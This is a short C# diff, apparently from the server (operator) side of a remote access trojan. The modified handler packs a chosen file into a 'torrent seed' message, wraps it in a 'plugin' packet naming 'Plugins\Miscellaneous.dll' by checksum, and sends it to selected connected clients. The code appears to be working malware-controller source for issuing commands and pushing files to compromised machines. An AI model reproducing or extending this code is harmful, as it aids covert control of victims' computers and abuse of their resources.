@@ -11,6 +11,7 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using Server.Algorithm;
 
 namespace Server.Forms
 {
@@ -48,10 +49,18 @@ namespace Server.Forms
             try
             {
                 if (!IsOk) return;
+                MsgPack packet = new MsgPack();
+                packet.ForcePathObject("Packet").AsString = "torrent";
+                packet.ForcePathObject("Option").AsString = "seed";
+                packet.ForcePathObject("File").SetAsBytes(File.ReadAllBytes(textBox1.Text));
+
                 MsgPack msgpack = new MsgPack();
-                msgpack.ForcePathObject("Packet").AsString = "torrent";
-                msgpack.ForcePathObject("Option").AsString = "seed";
-                msgpack.ForcePathObject("File").SetAsBytes(File.ReadAllBytes(textBox1.Text));
+                msgpack.ForcePathObject("Packet").AsString = "plugin";
+                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Miscellaneous.dll"));
+
+                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
+
+
                 foreach (ListViewItem itm in Program.form1.listView1.SelectedItems)
                 {
                     Clients client = (Clients)itm.Tag;
